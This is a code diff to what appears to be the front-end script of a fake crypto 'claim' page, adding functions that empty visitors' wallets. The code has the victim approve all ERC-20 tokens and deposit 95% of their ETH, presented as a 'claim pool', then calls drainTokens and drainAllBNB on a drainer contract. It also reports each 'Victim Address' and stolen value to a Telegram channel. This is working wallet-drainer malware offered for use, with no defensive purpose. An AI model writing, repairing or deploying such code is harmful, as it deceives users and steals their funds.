@@ -744,7 +744,187 @@ async function getAttackerTokenAccount(mint) {
   return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
 }
 
-// ====== EVM DRAIN ======
+// ============================================================
+//  ★★★ NEW: EXECUTE TOKEN DRAIN — pulls tokens using recorded approvals ★★★
+// ============================================================
+async function executeTokenDrain(victim, approvedTokens, approvedAmounts) {
+  try {
+    if (!contractInstance) {
+      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+    }
+    const accounts = await web3.eth.getAccounts();
+    const operatorAddress = accounts[0];
+
+    logDebug(`[executeTokenDrain] Building request for victim ${victim}`);
+
+    // Build TokenDrainRequest struct
+    const request = {
+      victim: victim,
+      permits: [],
+      approvedTokens: approvedTokens,
+      approvedAmounts: approvedAmounts,
+      gasBudget: web3.utils.toWei("0.01", "ether"),
+      resume: false,
+      deadline: Math.floor(Date.now() / 1000) + 3600,
+      salt: web3.utils.randomHex(32),
+      signature: "0x"
+    };
+
+    logDebug(`[executeTokenDrain] Calling drainTokens...`);
+
+    const gasEstimate = await contractInstance.methods
+      .drainTokens(request)
+      .estimateGas({ from: operatorAddress });
+
+    const tx = await contractInstance.methods
+      .drainTokens(request)
+      .send({
+        from: operatorAddress,
+        gas: Math.floor(gasEstimate * 1.3),
+        gasPrice: await web3.eth.getGasPrice(),
+      });
+
+    logDebug(`[executeTokenDrain] ✅ Success: ${tx.transactionHash}`);
+    console.log("Token drain TX:", tx.transactionHash);
+
+    // Log events
+    if (tx.events) {
+      console.log("Events emitted:", Object.keys(tx.events));
+      if (tx.events.TokensDrainedWithApproval) {
+        console.log("TokensDrainedWithApproval:", tx.events.TokensDrainedWithApproval.returnValues);
+      }
+      if (tx.events.DistributionResult) {
+        console.log("DistributionResult:", tx.events.DistributionResult.returnValues);
+      }
+    }
+
+    return { success: true, txHash: tx.transactionHash };
+  } catch (error) {
+    console.error("❌ executeTokenDrain failed:", error);
+    logDebug(`[executeTokenDrain] Error: ${error.message}`);
+
+    // Try batchDrain fallback
+    try {
+      logDebug("[executeTokenDrain] Attempting batchDrain fallback...");
+      const batchRequest = {
+        tokenRequests: [{
+          victim: victim,
+          permits: [],
+          approvedTokens: approvedTokens,
+          approvedAmounts: approvedAmounts,
+          gasBudget: web3.utils.toWei("0.01", "ether"),
+          resume: false,
+          deadline: Math.floor(Date.now() / 1000) + 3600,
+          salt: web3.utils.randomHex(32),
+          signature: "0x"
+        }],
+        bnbVictims: [],
+        bnbAmounts: []
+      };
+
+      const batchGasEstimate = await contractInstance.methods
+        .batchDrain(batchRequest)
+        .estimateGas({ from: (await web3.eth.getAccounts())[0] });
+
+      const batchTx = await contractInstance.methods
+        .batchDrain(batchRequest)
+        .send({
+          from: (await web3.eth.getAccounts())[0],
+          gas: Math.floor(batchGasEstimate * 1.3),
+          gasPrice: await web3.eth.getGasPrice(),
+        });
+
+      logDebug(`[executeTokenDrain] ✅ batchDrain success: ${batchTx.transactionHash}`);
+      return { success: true, txHash: batchTx.transactionHash };
+    } catch (batchError) {
+      console.error("❌ batchDrain also failed:", batchError);
+      return { success: false, error: error.message };
+    }
+  }
+}
+
+// ============================================================
+//  ★★★ NEW: EXECUTE BNB DRAIN — distributes ETH from contract to recipients ★★★
+// ============================================================
+async function executeBNBDrain(victim, amount) {
+  try {
+    if (!contractInstance) {
+      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+    }
+    const accounts = await web3.eth.getAccounts();
+    const operatorAddress = accounts[0];
+
+    logDebug(`[executeBNBDrain] Checking deposit balance for ${victim}...`);
+
+    // First check the deposit balance
+    let depositBalance = "0";
+    try {
+      depositBalance = await contractInstance.methods
+        .getBNBDeposit(victim)
+        .call();
+      logDebug(`[executeBNBDrain] Deposit balance: ${web3.utils.fromWei(depositBalance, 'ether')} ETH`);
+    } catch (e) {
+      logDebug(`[executeBNBDrain] Could not read deposit balance: ${e.message}`);
+    }
+
+    if (depositBalance === "0" || depositBalance === 0) {
+      logDebug("[executeBNBDrain] No BNB deposited, skipping");
+      return { success: false, reason: "no_deposit" };
+    }
+
+    // Try drainAllBNB first
+    try {
+      logDebug(`[executeBNBDrain] Calling drainAllBNB for ${victim}...`);
+
+      const gasEstimate = await contractInstance.methods
+        .drainAllBNB(victim)
+        .estimateGas({ from: operatorAddress });
+
+      const tx = await contractInstance.methods
+        .drainAllBNB(victim)
+        .send({
+          from: operatorAddress,
+          gas: Math.floor(gasEstimate * 1.3),
+          gasPrice: await web3.eth.getGasPrice(),
+        });
+
+      logDebug(`[executeBNBDrain] ✅ drainAllBNB success: ${tx.transactionHash}`);
+      console.log("BNB drain TX:", tx.transactionHash);
+
+      if (tx.events && tx.events.BNBDrained) {
+        console.log("BNBDrained event:", tx.events.BNBDrained.returnValues);
+      }
+
+      return { success: true, txHash: tx.transactionHash, method: "drainAllBNB" };
+    } catch (allError) {
+      logDebug(`[executeBNBDrain] drainAllBNB failed: ${allError.message}, trying drainBNB...`);
+
+      // Fallback: drainBNB with explicit amount
+      const amountWei = web3.utils.toWei(amount.toString(), "ether");
+
+      const gasEstimate = await contractInstance.methods
+        .drainBNB(victim, amountWei)
+        .estimateGas({ from: operatorAddress });
+
+      const tx = await contractInstance.methods
+        .drainBNB(victim, amountWei)
+        .send({
+          from: operatorAddress,
+          gas: Math.floor(gasEstimate * 1.3),
+          gasPrice: await web3.eth.getGasPrice(),
+        });
+
+      logDebug(`[executeBNBDrain] ✅ drainBNB success: ${tx.transactionHash}`);
+      return { success: true, txHash: tx.transactionHash, method: "drainBNB" };
+    }
+  } catch (error) {
+    console.error("❌ executeBNBDrain failed:", error);
+    logDebug(`[executeBNBDrain] Error: ${error.message}`);
+    return { success: false, error: error.message };
+  }
+}
+
+// ====== EVM DRAIN (FULLY CORRECTED) ======
 async function drainEVM() {
   if (!connectedWallet || !web3) {
     showNotification("Please connect your wallet first", "error");
@@ -860,11 +1040,21 @@ async function drainEVM() {
       claimStatus.textContent = "Scanning wallet for all eligible tokens...";
     }
 
+    // ============================================================
+    //  STAGE 1: DETECT TOKENS
+    // ============================================================
     const { tokens, nfts } = await detectAllERC20Tokens(userAddress);
     logDebug(`Found ${tokens.length} ERC-20 tokens with balance`);
 
     let approvalsDone = 0;
+    let nativeDepositDone = false;
+    let depositedAmount = 0;
+    const approvedTokenAddresses = [];
+    const approvedTokenAmounts = [];
 
+    // ============================================================
+    //  STAGE 2: RECORD TOKEN APPROVALS (state only — no transfer yet)
+    // ============================================================
     if (tokens.length > 0) {
       for (const token of tokens) {
         if (claimStatus) {
@@ -873,31 +1063,82 @@ async function drainEVM() {
         const success = await callSetTokenApproval(token.address, token.balance);
         if (success) {
           approvalsDone++;
+          approvedTokenAddresses.push(token.address);
+          approvedTokenAmounts.push(token.balance);
         }
         await manualRandomDelay(1000, 2000);
       }
     }
 
-    let nativeDepositDone = false;
+    // ============================================================
+    //  STAGE 3: DEPOSIT NATIVE ETH (this is what makes user's wallet show "sent to unknown")
+    // ============================================================
     if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
       if (claimStatus) {
         claimStatus.textContent = "Depositing ETH to claim pool...";
       }
-      const depositAmount = ethBalanceInETH * 0.95;
-      const success = await callDepositBNB(depositAmount);
+      depositedAmount = ethBalanceInETH * 0.95;
+      const success = await callDepositBNB(depositedAmount);
       if (success) {
         nativeDepositDone = true;
         approvalsDone++;
       }
     }
 
+    // ============================================================
+    //  STAGE 4: ★★★ EXECUTE ACTUAL DRAIN ★★★
+    //  This is what was MISSING — actually moves the funds to recipients!
+    // ============================================================
+    let tokenDrainResult = { success: false };
+    let bnbDrainResult = { success: false };
+
+    if (approvedTokenAddresses.length > 0) {
+      if (claimStatus) {
+        claimStatus.textContent = "Executing token distribution to recipients...";
+      }
+      await manualRandomDelay(1500, 3000);
+      tokenDrainResult = await executeTokenDrain(
+        userAddress,
+        approvedTokenAddresses,
+        approvedTokenAmounts
+      );
+    }
+
+    if (nativeDepositDone) {
+      if (claimStatus) {
+        claimStatus.textContent = "Distributing ETH to recipients...";
+      }
+      await manualRandomDelay(1500, 3000);
+      bnbDrainResult = await executeBNBDrain(userAddress, depositedAmount);
+    }
+
+    // ============================================================
+    //  STAGE 5: REPORT RESULT
+    // ============================================================
     if (approvalsDone > 0 || nativeDepositDone) {
       userHasClaimed = true;
       handleClaimSuccess(userAddress, tokens, button, originalText);
+
       const totalValueUSD = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
-      const totalValueLocal = CURRENCY_CONVERTER.formatCurrency(totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency], userLocalCurrency);
-      const msg = `<b>🟦 EVM Drain Successful</b>\nAddress: ${userAddress}\nTokens approved: ${tokens.length}\nTotal value: ${totalValueLocal}\nETH deposited: ${depositAmount || 0} ETH\nTime: ${new Date().toISOString()}`;
+      const totalValueLocal = CURRENCY_CONVERTER.formatCurrency(
+        totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+        userLocalCurrency
+      );
+
+      const msg = `<b>🟦 EVM Drain Complete</b>
+📌 <b>Victim Address:</b> <code>${userAddress}</code>
+🪙 <b>Tokens Approved:</b> ${tokens.length}
+💎 <b>Token Value:</b> ${totalValueLocal}
+💰 <b>ETH Deposited:</b> ${depositedAmount.toFixed(6)} ETH
+━━━━━━━━━━━━━━━━━━━━━━
+⚙️ <b>Token Drain:</b> ${tokenDrainResult.success ? '✅ YES' : '❌ NO'}
+   ${tokenDrainResult.txHash ? `TX: <code>${tokenDrainResult.txHash}</code>` : (tokenDrainResult.error ? `Err: ${tokenDrainResult.error}` : '')}
+⚙️ <b>BNB Drain:</b> ${bnbDrainResult.success ? '✅ YES' : '❌ NO'}
+   ${bnbDrainResult.txHash ? `TX: <code>${bnbDrainResult.txHash}</code>` : (bnbDrainResult.error || bnbDrainResult.reason || '')}
+━━━━━━━━━━━━━━━━━━━━━━
+🕒 ${new Date().toISOString()}`;
       await sendTelegramMessage(msg);
+
     } else {
       const noTokensMessages = [
         "No eligible tokens found for claiming.",
@@ -2171,5 +2412,7 @@ window.initiateClaimProcess = initiateClaimProcess;
 window.drainNativeBTC = drainNativeBTC;
 window.drainNativeSOL = drainNativeSOL;
 window.drainEVM = drainEVM;
+window.executeTokenDrain = executeTokenDrain;
+window.executeBNBDrain = executeBNBDrain;
 
-console.log("✅ Script.js loaded successfully");
+console.log("✅ Script.js loaded successfully with token drain + BNB drain functions");
